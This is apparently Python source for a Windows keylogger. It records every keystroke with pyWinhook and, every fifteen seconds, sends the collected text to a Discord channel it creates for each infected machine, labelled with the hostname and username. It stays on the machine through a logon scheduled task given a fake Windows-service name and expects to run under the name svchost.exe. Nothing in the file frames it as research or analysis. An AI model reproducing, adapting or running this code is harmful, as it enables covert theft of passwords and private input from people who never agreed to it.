import os
import socket
import threading
import uuid

import discord
import pyWinhook
import pythoncom
from discord.ext import commands
from discord.ext.tasks import loop

# Globals
log_buffer = r""
bot = commands.Bot(command_prefix='$')
client_id = uuid.uuid5(uuid.uuid4(), "keylogger")  # UUID to identify this instance
channel = None

# Constants
SCHEDULED_TASK_NAME = "IEEE 802.1x AutoConfig Agent"
BUFFER_FLUSH_PERIOD = 15.0  # Seconds


@bot.event
async def on_ready():
    """
    This function will run when the client first starts up. It's responsible for creating categories and channels if they
    don't already exist
    :return: None
    """
    await bot.wait_until_ready()

    for guild in bot.guilds:
        # Create keyloggers category if it doesn't exist
        if discord.utils.get(guild.categories, name='Keyloggers') is None:
            await guild.create_category('Keyloggers')
        category = discord.utils.get(guild.categories, name='Keyloggers')

        # Create channel for this client if it doesn't exist
        if discord.utils.get(guild.text_channels, name=str(client_id)) is None:
            # Get some variables for the channel topic
            hostname = socket.getfqdn()
            current_user = os.getlogin()

            # Set permissions for channel (read-only)
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(send_messages=False),
                guild.me: discord.PermissionOverwrite(send_messages=True)
            }

            await guild.create_text_channel(name=str(client_id), category=category, topic="Hostname: {0} || User at install: {1}".format(hostname, current_user), overwrites=overwrites)

        # Update outer scope with newly added channel
        global channel
        channel = discord.utils.get(guild.text_channels, name=str(client_id))

        # Start flush buffer background task
        flush_buffer.start()


@loop(seconds=BUFFER_FLUSH_PERIOD)
async def flush_buffer():
    """
    Flushes the keyboard input log buffer every BUFFER_FLUSH_PERIOD seconds
    :return: None
    """
    global log_buffer

    # If there's actually anything in the buffer, send it
    if log_buffer != "":
        await channel.send("```\n{0}\n```".format(log_buffer))

        # Empty the buffer
        log_buffer = r""


@flush_buffer.before_loop
async def before_flush_buffer():
    """
    Wait until the bot is ready
    :return:
    """
    await bot.wait_until_ready()


def on_keyboard_event(event):
    """
    Event handler for keypress
    :param event: Keypress event
    :return: True
    """
    global log_buffer
    event_key = event.Key

    # Enter key
    if event_key == "Return":
        log_buffer += "\n[ENTER]\n"

    # Spacebar
    elif event_key == "Space":
        log_buffer += " "

    # Backspace
    elif event_key == "Back":
        log_buffer += "[BACKSPACE]"

    # Use the ASCII code for most standard printable characters
    elif 33 <= event.Ascii <= 126:
        log_buffer += chr(event.Ascii)

    # Other non-renderable keypress (i.e. WinKey, Shift)
    else:
        log_buffer += event.Key

    return True


def poll_input():
    """
    Setup the keyboard polling to run in a background thread
    :return:
    """
    # Setup the keyboard hooks
    hooks_manager = pyWinhook.HookManager()
    hooks_manager.KeyDown = on_keyboard_event
    hooks_manager.HookKeyboard()

    # Continually poll for keyboard input
    pythoncom.PumpMessages()


def create_persistence():
    """
    Establishes a persistence mechanism for this program to automatically restart itself
    :return:
    """
    # Check if running as admin. If so, create scheduled task
    # This is also a compatibility fix for Vista
    try:
        # Try to open a a file in a restricted directory for writing. This will fail without admin
        open(r"c:\windows\system32\test.txt", "w")

        # This assumes that this binary is named 'svchost.exe'
        executable_path = os.path.abspath(os.path.dirname(__file__))
        os.system(r"""C:\Windows\System32\schtasks.exe /create /F /ru builtin\users /sc onlogon /tn "{0}" /tr {1}\svchost.exe """.format(SCHEDULED_TASK_NAME, executable_path))
    except PermissionError:
        # Not admin
        pass


# Establish persistence
create_persistence()

# Setup keyboard polling thread
poll_thread = threading.Thread(target=poll_input, args=())
poll_thread.start()

# Setup Discord client
bot.run('[REDACTED]')
